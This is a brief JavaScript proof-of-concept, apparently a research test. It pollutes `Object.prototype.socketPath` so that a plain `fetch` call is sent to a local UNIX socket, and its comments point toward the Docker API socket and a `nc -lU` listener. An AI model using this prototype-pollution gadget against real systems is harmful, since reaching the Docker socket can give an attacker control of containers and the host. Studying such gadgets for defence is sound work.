// listen the socket by `nc -lU /tmp/socket1`

// By default, Docker runs through a non-networked UNIX socket.
// try to use it to send GET requiest /containers/json 

Object.prototype.socketPath = '/tmp/socket1';

async function main() {
  console.log(await fetch('http://example.com'))
}

main();